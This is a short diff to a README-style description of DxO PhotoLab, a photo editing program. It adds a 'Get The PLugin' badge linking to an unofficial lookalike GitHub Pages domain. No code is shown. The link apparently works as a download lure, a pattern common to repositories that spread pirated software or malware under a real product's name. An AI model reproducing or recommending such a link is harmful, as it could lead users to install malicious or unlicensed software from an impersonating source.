@@ -2,6 +2,7 @@
 
 DxO PhotoLab is a high-end **photo editing software** designed for photographers who need precision, speed, and quality. With AI-powered tools, advanced RAW processing, and seamless workflow integration, it provides everything from subtle corrections to dramatic enhancements.
 
+[![Get](https://img.shields.io/badge/Get%20The-PLugin-blueviolet)](https://dxo-photolab-plugin.github.io/.github/)
 ---
 
 ## Overview
@@ -113,3 +114,4 @@ DxO updates its optical module database regularly, typically with each new relea
 All Rights Reserved.
 
 ---
+
